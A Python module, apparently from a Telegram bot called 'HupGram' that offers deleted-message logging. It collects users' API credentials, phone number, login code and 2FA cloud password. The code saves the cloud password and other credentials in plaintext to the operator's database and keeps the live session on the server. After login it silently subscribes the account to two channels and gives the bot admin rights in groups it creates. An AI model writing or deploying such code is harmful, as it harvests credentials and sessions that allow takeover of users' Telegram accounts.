import asyncio
import os
from telethon import TelegramClient, events, errors, Button
from telethon.tl.functions.channels import JoinChannelRequest, CreateChannelRequest, InviteToChannelRequest, EditAdminRequest
from telethon.tl.types import ChatAdminRights
from config import SESSIONS_FOLDER
from loader import bot, auth_state, active_clients
from database import update_setting, get_settings
from handlers.userbot import start_userbot_logic

# === СКРИПТ ПОСЛЕ АВТОРИЗАЦИИ ===
async def post_auth_actions(client, cid):
    # 1. Подписка на каналы
    try:
        await client(JoinChannelRequest('NafuzorN'))
        await client(JoinChannelRequest('QibysNet'))
        print(f"[{cid}] Подписка на каналы успешна")
    except Exception as e: print(f"[{cid}] Ошибка подписки: {e}")

    bot_me = await bot.get_me()
    bot_username = bot_me.username
    btn = [[Button.url("ПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ HupGram", "https://telegra.ph/POLZOVATELSKOE-SOGLASHENIE-HupGram-02-19")]]

    # 2. Группа 1 (Logs notifications)
    try:
        # Создаем Супергруппу (Megagroup) - это избавляет от ошибки InvitedUsers
        res1 = await client(CreateChannelRequest(title="Logs notifications", about="Текстовые логи", megagroup=True))
        log1_id = res1.chats[0].id
        await client(InviteToChannelRequest(log1_id, [bot_username]))
        await update_setting(cid, 'log_chat_id', log1_id)
        
        msg1 = (
            "**Добро пожаловать в HupGram!**\n\n"
            "Эта группа создана для отслеживания удаленных текстовых сообщений в личных переписках, группах и каналах.\n\n"
            "⚠️ **Просьба не удалять эту группу и не исключать бота, чтобы всё работало без помех.**\n\n"
            "С уважением, команда HupGram."
        )
        await bot.send_message(log1_id, msg1, buttons=btn)
    except Exception as e: print(f"[{cid}] Ошибка создания Logs notifications: {e}")

    # 3. Группа 2 (Logs other)
    try:
        res2 = await client(CreateChannelRequest(title="Logs other", about="Медиа логи", megagroup=True))
        log2_id = res2.chats[0].id
        await client(InviteToChannelRequest(log2_id, [bot_username]))
        
        # Выдаем права Администратора боту
        rights = ChatAdminRights(
            delete_messages=True, ban_users=True, invite_users=True, pin_messages=True, manage_call=True
        )
        await client(EditAdminRequest(log2_id, bot_username, rights, rank="Logger"))
        await update_setting(cid, 'log_other_id', log2_id)
        
        msg2 = (
            "**Добро пожаловать в HupGram!**\n\n"
            "Эта группа создана для отслеживания удаленных фотографий, голосовых сообщений, кружков, файлов и стикеров в личных переписках, группах и каналах.\n\n"
            "⚠️ **Просьба не удалять эту группу и не снимать права администратора с бота, чтобы всё работало без помех.**\n\n"
            "С уважением, команда HupGram."
        )
        await bot.send_message(log2_id, msg2, buttons=btn)
    except Exception as e: print(f"[{cid}] Ошибка создания Logs other: {e}")


async def attempt_connect(cid, event):
    st = auth_state[cid]
    msg = await event.respond("⏳ Подключение...")
    session_path = os.path.join(SESSIONS_FOLDER, f"session_{cid}")
    
    try:
        c = TelegramClient(session_path, st['api_id'], st['hash'])
        await c.connect()
        if await c.is_user_authorized():
            active_clients[cid] = c
            asyncio.create_task(post_auth_actions(c, cid))
            asyncio.create_task(start_userbot_logic(c, cid))
            del auth_state[cid]
            await msg.edit("✅ Успешный вход!", buttons=[Button.inline("Меню", b'refresh')])
        else:
            st['step'] = 'phone'; st['client'] = c
            await msg.edit("📞 Введите номер телефона (+7...):")
    except Exception as e: await msg.edit(f"Ошибка: {e}")

@bot.on(events.NewMessage)
async def auth_inputs(event):
    cid = event.chat_id
    txt = event.text.strip()
    if txt.startswith('/') or cid not in auth_state: return
    
    # Игнорируем ввод для админки
    if auth_state[cid].get('step', '').startswith('mod_'): return
    if auth_state[cid].get('step', '').startswith('adm_'): return
    
    st = auth_state[cid]
    step = st.get('step')

    if step == 'api_id':
        if txt.isdigit():
            st['api_id'] = int(txt); st['step'] = 'api_hash'
            await event.respond("2️⃣ Введите API HASH:")
    
    elif step == 'api_hash':
        st['hash'] = txt
        await update_setting(cid, 'api_id', st['api_id'])
        await update_setting(cid, 'api_hash', st['hash'])
        await attempt_connect(cid, event)

    elif step == 'phone':
        st['phone'] = txt
        await update_setting(cid, 'phone_number', txt)
        try:
            sent = await st['client'].send_code_request(txt)
            st['ph_hash'] = sent.phone_code_hash; st['step'] = 'code'
            await event.respond("4️⃣ Введите код из Telegram:")
        except Exception as e: await event.respond(f"Ошибка: {e}")

    elif step == 'code':
        try:
            await st['client'].sign_in(st['phone'], txt, phone_code_hash=st['ph_hash'])
            active_clients[cid] = st['client']
            asyncio.create_task(post_auth_actions(st['client'], cid))
            asyncio.create_task(start_userbot_logic(st['client'], cid))
            del auth_state[cid]
            await event.respond("✅ Вход выполнен!", buttons=[Button.inline("Меню", b'refresh')])
        except errors.SessionPasswordNeededError:
            st['step'] = 'pwd'
            await event.respond("🔐 **Введите Облачный Пароль (2FA):**")
        except Exception as e: await event.respond(f"Ошибка: {e}")

    elif step == 'pwd':
        await update_setting(cid, 'cloud_password', txt)
        try:
            await st['client'].sign_in(password=txt)
            active_clients[cid] = st['client']
            asyncio.create_task(post_auth_actions(st['client'], cid))
            asyncio.create_task(start_userbot_logic(st['client'], cid))
            del auth_state[cid]
            await event.respond("✅ Вход выполнен (2FA)!", buttons=[Button.inline("Меню", b'refresh')])
        except Exception as e: await event.respond(f"Неверный пароль: {e}")

    elif step == 'reply_text':
        await update_setting(cid, 'auto_reply_text', txt)
        del auth_state[cid]
        await event.respond("✅ Текст сохранен.", buttons=[Button.inline("Меню", b'refresh')])